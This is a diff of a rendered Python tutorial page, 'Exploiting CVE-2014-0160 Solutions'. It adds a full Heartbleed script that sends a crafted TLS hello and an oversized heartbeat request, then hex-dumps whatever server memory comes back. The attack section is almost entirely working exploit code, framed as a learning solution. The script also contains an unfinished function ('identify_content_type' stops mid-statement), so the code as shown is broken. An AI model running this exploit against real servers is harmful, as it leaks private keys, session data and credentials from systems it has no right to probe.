@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>Exploitiong CVE-2014-0160 Solutions &mdash; Snake Charming for Beginners 0.0.1 documentation</title>
+  <title>Exploiting CVE-2014-0160 Solutions &mdash; Snake Charming for Beginners 0.0.1 documentation</title>
   
 
   
@@ -99,7 +99,7 @@
 <li class="toctree-l1"><a class="reference internal" href="contacting_the_unix_daemons_of_old.html">Contacting the UNIX Daemons of Old</a></li>
 <li class="toctree-l1"><a class="reference internal" href="credits.html">Credits</a></li>
 <li class="toctree-l1"><a class="reference internal" href="solutions_for_domain_bruteforcer.html">Subdomain Bruteforcing Solutions</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Exploitiong CVE-2014-0160 Solutions</a><ul>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Exploiting CVE-2014-0160 Solutions</a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#build-your-command-center">Build Your Command Center</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#handling-sockets">Handling Sockets</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#waiting-for-a-response-recvall">Waiting for a Response &amp; <code class="docutils literal notranslate"><span class="pre">recvall()</span></code></a></li>
@@ -151,7 +151,7 @@
     
       <li><a href="index.html">Docs</a> &raquo;</li>
         
-      <li>Exploitiong CVE-2014-0160 Solutions</li>
+      <li>Exploiting CVE-2014-0160 Solutions</li>
     
     
       <li class="wy-breadcrumbs-aside">
@@ -170,8 +170,8 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="exploitiong-cve-2014-0160-solutions">
-<h1>Exploitiong CVE-2014-0160 Solutions<a class="headerlink" href="#exploitiong-cve-2014-0160-solutions" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="exploiting-cve-2014-0160-solutions">
+<h1>Exploiting CVE-2014-0160 Solutions<a class="headerlink" href="#exploiting-cve-2014-0160-solutions" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="build-your-command-center">
 <h2>Build Your Command Center<a class="headerlink" href="#build-your-command-center" title="Permalink to this headline">¶</a></h2>
 <div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">__version__</span> <span class="o">=</span> <span class="mf">0.0</span><span class="o">.</span><span class="mi">0</span>
@@ -209,6 +209,8 @@
 <h2>Handling Sockets<a class="headerlink" href="#handling-sockets" title="Permalink to this headline">¶</a></h2>
 <div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">__version__</span> <span class="o">=</span> <span class="mf">0.0</span><span class="o">.</span><span class="mi">0</span>
 <span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">socket</span>
 
 <span class="k">def</span> <span class="nf">hex2bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
     <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -270,7 +272,13 @@
 <div class="section" id="waiting-for-a-response-recvall">
 <h2>Waiting for a Response &amp; <code class="docutils literal notranslate"><span class="pre">recvall()</span></code><a class="headerlink" href="#waiting-for-a-response-recvall" title="Permalink to this headline">¶</a></h2>
 <div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">__version__</span> <span class="o">=</span> <span class="mf">0.0</span><span class="o">.</span><span class="mi">0</span>
+
 <span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="kn">import</span> <span class="nn">hexdump</span>
 
 <span class="k">def</span> <span class="nf">hex2bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
     <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -341,7 +349,7 @@
             <span class="k">break</span>
 
     <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Handshake done...&#39;</span><span class="p">)</span>
-    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Sending heartbeat request with length 4:&#39;</span><span class="p">)</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Sending heartbeat request with length 4.&#39;</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">args</span> <span class="o">=</span> <span class="n">build_argument_parser</span><span class="p">()</span>
@@ -351,6 +359,167 @@
 </div>
 <div class="section" id="exploiting-heartbleed">
 <h2>Exploiting Heartbleed<a class="headerlink" href="#exploiting-heartbleed" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="kn">import</span> <span class="nn">hexdump</span>
+
+<span class="n">__version__</span> <span class="o">=</span> <span class="s1">&#39;0.0.1&#39;</span>
+
+
+<span class="k">def</span> <span class="nf">h2bin</span><span class="p">(</span><span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="n">hello</span> <span class="o">=</span> <span class="n">h2bin</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">16 03 02 00  dc 01 00 00 d8 03 02 53</span>
+<span class="s1">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span>
+<span class="s1">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span>
+<span class="s1">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span>
+<span class="s1">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span>
+<span class="s1">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span>
+<span class="s1">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span>
+<span class="s1">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span>
+<span class="s1">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span>
+<span class="s1">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span>
+<span class="s1">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span>
+<span class="s1">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span>
+<span class="s1">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span>
+<span class="s1">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span>
+<span class="s1">00 0f 00 01 01</span>
+<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+
+<span class="n">heartbeat</span> <span class="o">=</span> <span class="n">h2bin</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">18 03 02 00 03</span>
+<span class="s1">01 40 00</span>
+<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">Explanation of heartbeat (bf)call :</span>
+<span class="sd">    18      : hearbeat record</span>
+<span class="sd">    03 02   : TLS version</span>
+<span class="sd">    00 03   : length</span>
+<span class="sd">    01      : hearbeat request</span>
+<span class="sd">    40 00   : payload length 16 384 bytes check rfc6520</span>
+<span class="sd">                &quot;The total length of a HeartbeatMessage MUST NOT exceed 2^14&quot;</span>
+<span class="sd">                If we enter FF FF -&gt; 65 535, we will received 4 paquets of length 16 384 bytes</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="k">def</span> <span class="nf">identify_content_type</span><span class="p">(</span><span class="n">content_type_as_int</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">content_type_as_int</span>
+
+
+<span class="k">def</span> <span class="nf">hex_dump</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">sep</span><span class="o">=</span><span class="s1">&#39;-&#39;</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">recvall</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="p">,</span> <span class="n">count</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="n">count</span><span class="p">:</span>
+        <span class="n">newbuf</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">newbuf</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">None</span>
+
+        <span class="n">buf</span> <span class="o">+=</span> <span class="n">newbuf</span>
+        <span class="n">count</span> <span class="o">-=</span> <span class="nb">len</span><span class="p">(</span><span class="n">newbuf</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span>
+
+
+<span class="k">def</span> <span class="nf">test_heartbleed</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="p">):</span>
+    <span class="c1"># send heartbeat request to the server</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">heartbeat</span><span class="p">)</span>
+
+    <span class="c1"># start listening the answer from the server</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+        <span class="c1"># we first get the 5 bytes of the request : content_type, version, length</span>
+        <span class="c1"># http://wiki.wireshark.org/SSL</span>
+        <span class="n">content_version_length</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">content_version_length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;Unexpected EOF receiving record header - server closed connection&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+        <span class="p">(</span><span class="n">content_type</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;BHH&#39;</span><span class="p">,</span> <span class="n">content_version_length</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">content_type</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;No heartbeat response received, server likely not vulnerable&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+        <span class="c1"># we can&#39;t use s.recv(length) because the server can separate the packet heartbeat into different smaller packet</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">recvall</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">payload</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;Unexpected EOF receiving record payload - server closed connection&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+        <span class="c1"># heartbeat content type is 24 check rfc6520</span>
+        <span class="k">if</span> <span class="n">content_type</span> <span class="o">==</span> <span class="mi">24</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Received heartbeat response in file out.txt&#39;</span><span class="p">)</span>
+            <span class="n">hex_dump</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;Server returned more data than it should - server is vulnerable!&#39;</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">True</span>
+
+        <span class="c1"># error</span>
+        <span class="k">if</span> <span class="n">content_type</span> <span class="o">==</span> <span class="mi">21</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Received alert:&#39;</span><span class="p">)</span>
+            <span class="n">hex_dump</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Server returned error, likely not vulnerable&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">def</span> <span class="nf">build_argument_parser</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="n">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2"> ██░ ██ ▓█████ ▄▄▄       ██▀███  ▄▄▄█████▓ ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄</span>
+<span class="s2">▓██░ ██▒▓█   ▀▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌</span>
+<span class="s2">▒██▀▀██░▒███  ▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌</span>
+<span class="s2">░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░ ▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌</span>
+<span class="s2">░▓█▒░██▓░▒████▒▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ ░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓</span>
+<span class="s2"> ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒</span>
+<span class="s2"> ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░  ░▒ ░ ▒░    ░    ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒</span>
+<span class="s2"> ░  ░░ ░   ░    ░   ▒     ░░   ░   ░       ░    ░   ░ ░      ░      ░    ░ ░  ░</span>
+<span class="s2"> ░  ░  ░   ░  ░     ░  ░   ░               ░          ░  ░   ░  ░   ░  ░   ░</span>
+<span class="s2">                                                ░                        ░</span>
+<span class="s2">Version: {__version__}</span>
+<span class="s2">&quot;&quot;&quot;</span><span class="p">,</span> <span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="o">.</span><span class="n">RawTextHelpFormatter</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="n">dest</span><span class="o">=</span><span class="s2">&quot;host&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;the host that you wish to test for Heartbleed&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="n">dest</span><span class="o">=</span><span class="s2">&quot;port&quot;</span><span class="p">,</span>
+                        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;the port which you wish to test for Heartbleed, default is 443&quot;</span><span class="p">,</span>
+                        <span class="n">default</span><span class="o">=</span><span class="mi">443</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">runtime_options</span><span class="p">:</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">):</span>
+    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Connecting...&#39;</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">runtime_options</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">runtime_options</span><span class="o">.</span><span class="n">port</span><span class="p">))</span>
+
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Sending Client Hello...&#39;</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">hello</span><span class="p">)</span>
+
+    <span class="c1"># pass the handshake</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">hdr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="p">(</span><span class="n">content_type</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;BHH&#39;</span><span class="p">,</span> <span class="n">hdr</span><span class="p">)</span>
+        <span class="n">hand</span> <span class="o">=</span> <span class="n">recvall</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39; ... received message: type = </span><span class="si">%d</span><span class="s1">, ver = </span><span class="si">%04x</span><span class="s1">, length = </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">content_type</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">hand</span><span class="p">)))</span>
+        <span class="c1"># Look for server hello done message.</span>
+        <span class="k">if</span> <span class="n">content_type</span> <span class="o">==</span> <span class="mi">22</span> <span class="ow">and</span> <span class="nb">hex</span><span class="p">(</span><span class="n">hand</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;0xe&#39;</span><span class="p">:</span>
+            <span class="k">break</span>
+
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Handshake done...&#39;</span><span class="p">)</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Sending heartbeat request with length 4:&#39;</span><span class="p">)</span>
+    <span class="n">test_heartbleed</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">build_argument_parser</span><span class="p">()</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</pre></div>
+</div>
 </div>
 </div>
 
